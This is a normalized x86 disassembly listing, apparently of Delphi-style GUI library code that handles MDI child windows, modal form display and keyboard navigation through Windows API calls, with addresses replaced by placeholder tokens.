je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_462b50
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_462b7c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44bd08
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_460b8c
lea edx [ ebp - 0x14 ]
call sub_464354
push ebp
mov eax [ ebp - 0x4 ]
call sub_460b8c
lea edx [ ebp - 0x24 ]
call sub_464354
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_462b50
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_460b8c
lea edx [ ebp - 0x24 ]
call sub_464354
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_462b50
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_462b50
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_462b50
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_462c34
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_40358c
pop esi
pop ebx
retn
sub_462c58
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_40358c
pop esi
pop ebx
retn
sub_462c7c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_44cbe8
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_44dcd8
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_44dcd8
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_462d18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_463282
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_4674d4
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_463265
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46326c
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
xor eax eax
push ebp
push sub_46316c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_40358c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_462dd0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_40358c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_461ec4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44acc4
jmp r-xdata
mov eax [ rw-data ]
call sub_4645b0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_446988
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_44d7a4
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_4645a4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4469cc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d7a4
call sub_45db28
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_4645e0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_446988
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_4645b0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_4471e4
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_4645d4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4469cc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_4645a4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_461174
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_461174
jmp r-xdata
sub_462dd5
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_466be8
call sub_403bd8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_4645b0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_446988
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_4645a4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4469cc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_4645e0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_446988
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_4645b0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46326c
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_4471e4
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_4645d4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4469cc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_4645a4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_461174
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_461174
jmp r-xdata
sub_463171
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_466be8
call sub_403bd8
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_461ec4
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44acc4
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_44d7a4
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46326c
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d7a4
call sub_45db28
mov ebx eax
sub_4632b8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_463310
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_426c68
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46336e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403390
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_46337c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_40358c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4633a8
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_466bd4
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_40358c
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_463548
jmp r-xdata
mov eax ebx
call sub_4635e4
mov dl 0x1
mov eax ebx
call sub_461134
jmp r-xdata
sub_46344c
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_460ac0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_460b0c
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_4634b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46351c
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_40358c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4635e4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_463568
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4635d6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4635dd
lea eax [ ebp - 0x4 ]
call sub_404120
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_461dc0
sub_463600
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4638c8
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_4457e4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_465aa0
xor edx edx
push ebp
push sub_4638ab
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_41b6d0
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_464ad0
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_45d9d8
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_463889
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_463550
xor edx edx
push ebp
push sub_4637e8
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4634b0
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_466954
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_44d7a4
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4637ef
mov eax [ ebp - 0x4 ]
call sub_463548
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_4637ef
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463893
mov eax [ rw-data ]
